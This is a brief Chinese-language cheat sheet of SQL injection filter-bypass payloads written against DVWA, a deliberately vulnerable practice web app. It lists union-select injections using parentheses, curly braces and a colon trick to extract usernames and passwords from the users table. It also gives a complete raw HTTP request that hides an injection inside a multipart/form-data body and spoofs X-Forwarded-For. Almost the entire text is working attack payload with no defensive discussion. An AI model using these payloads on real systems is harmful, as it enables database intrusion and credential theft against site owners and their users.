
## 小括号bypass

	1' union(select 1,schema_name from information_schema.schemata limit 1)#
	1' union(select 1,concat(user,'|',password) from dvwa.users limit 1) #
	
## 花括号bypass

    1' union select{x 1},concat(user,'|',password) from dvwa.users limit 1 #

## Content-Type: multipart/form-data bypass

    POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
    Host: 192.168.14.51
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Cookie: security=low; PHPSESSID=3fma7pasfhml449rtl21nvnuc0
    X-Forwarded-For: 127.0.0.1
    Connection: keep-alive
    Content-Type: multipart/form-data; boundary=--------915864227
    Content-Length: 196

    ----------915864227
    Content-Disposition: form-data; name="id"   

    1' union select user(),2 #
    ----------915864227
    Content-Disposition: form-data; name="Submit"   

    Submit#
    ----------915864227--

## 其他思路

    1' union select:a,concat(user,'|',password) from dvwa.users limit 1 #